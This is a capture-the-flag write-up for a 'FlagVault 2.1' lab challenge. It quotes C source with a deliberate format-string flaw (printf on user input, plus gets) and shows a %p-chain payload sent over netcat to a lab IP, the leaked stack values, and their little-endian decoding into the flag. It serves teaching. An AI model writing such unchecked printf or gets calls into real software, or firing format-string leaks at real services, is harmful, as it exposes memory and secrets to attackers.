# Challenge description

How did you do that? No worries. I'll adjust a couple of lines of code so you won't be able to get the flag anymore. This time, for real. Here's the source code once again. 

nc 10.10.240.119 1337

# Soluce

The vault’s source code is as follows:

```c
#include <stdio.h>
#include <string.h>

void print_banner(){
        printf( "  ______ _          __      __         _ _   \n"
                " |  ____| |         \\ \\    / /        | | |  \n"
                " | |__  | | __ _  __ \\ \\  / /_ _ _   _| | |_ \n"
                " |  __| | |/ _` |/ _` \\ \\/ / _` | | | | | __|\n"
                " | |    | | (_| | (_| |\\  / (_| | |_| | | |_ \n"
                " |_|    |_|\\__,_|\\__, | \\/ \\__,_|\\__,_|_|\\__|\n"
                "                  __/ |                      \n"
                "                 |___/                       \n"
                "                                             \n"
                "Version 2.1 - Fixed print_flag to not print the flag. Nothing you can do about it!\n"
                "==================================================================\n\n"
              );
}

void print_flag(char *username){
        FILE *f = fopen("flag.txt","r");
        char flag[200];

        fgets(flag, 199, f);
        //printf("%s", flag);

        //The user needs to be mocked for thinking they could retrieve the flag
        printf("Hello, ");
        printf(username);
        printf(". Was version 2.0 too simple for you? Well I don't see no flags being shown now xD xD xD...\n\n");
        printf("Yours truly,\nByteReaper\n\n");
}

void login(){
        char username[100] = "";

        printf("Username: ");
        gets(username);

        // The flag isn't printed anymore. No need for authentication
        print_flag(username);
}

void main(){
        setvbuf(stdin, NULL, _IONBF, 0);
        setvbuf(stdout, NULL, _IONBF, 0);
        setvbuf(stderr, NULL, _IONBF, 0);

        // Start login process
        print_banner();
        login();

        return;
}
```

The vault has been updated to version 2.1. The `print_flag` function has been modified to not print the flag. The `login` function now calls `print_flag` without any authentication. We can still retrieve the flag by providing a username that contains the flag.

By supplying specially crafted input as the username, an attacker can use format string specifiers (such as %p or %s) to leak memory contents from the stack. Since the flag was read into memory (in the local variable flag), it is likely stored on the stack nearby. This enables the attacker to print out the flag indirectly.

```sh
┌──(virgile㉿localhost)-[~/Téléchargements]
└─$ python -c 'print("%p %p %p %p %p %p %p %p %p %p %p %p %p %p %p")' | nc 10.10.240.119 1337                                                                                                                                              
  ______ _          __      __         _ _   
 |  ____| |         \ \    / /        | | |  
 | |__  | | __ _  __ \ \  / /_ _ _   _| | |_ 
 |  __| | |/ _` |/ _` \ \/ / _` | | | | | __|
 | |    | | (_| | (_| |\  / (_| | |_| | | |_ 
 |_|    |_|\__,_|\__, | \/ \__,_|\__,_|_|\__|
                  __/ |                      
                 |___/                       
                                             
Version 2.1 - Fixed print_flag to not print the flag. Nothing you can do about it!
==================================================================

Username: Hello, 0x7fff73d6deb0 (nil) 0x7fe774e65887 0x7 0x55aba20a1480 0x7fff73d70268 0x7fff73d700d0 0x7fe774f68600 0x55aba20a12a0 0x6d726f667b4d4854 0x65757373695f7461 0xa7d73 0x7fe774dded96 0x7fe774f67a00 (nil). Was version 2.0 too simple for you? Well I don't see no flags being shown now xD xD xD...

Yours truly,
ByteReaper
```

In the output, look for values that, when interpreted as hexadecimal bytes in little-endian order, form readable ASCII strings. For example, you might see:

- 0x6d726f667b4d4854 which corresponds to the ASCII string `mrof{MHT`
- 0x65757373695f7461 which corresponds to the ASCII string `eussi_ta`

The 64-bit architecture uses little-endian, which causes the bytes in hexadecimal values ​​to appear in reverse order compared to their normal reading. This explains why 0x6d726f667b4d4854 translates to "THM{form" when properly reassembled.

We don't have the full flag, but we can deduce that the flag is `THM{format_issues}`.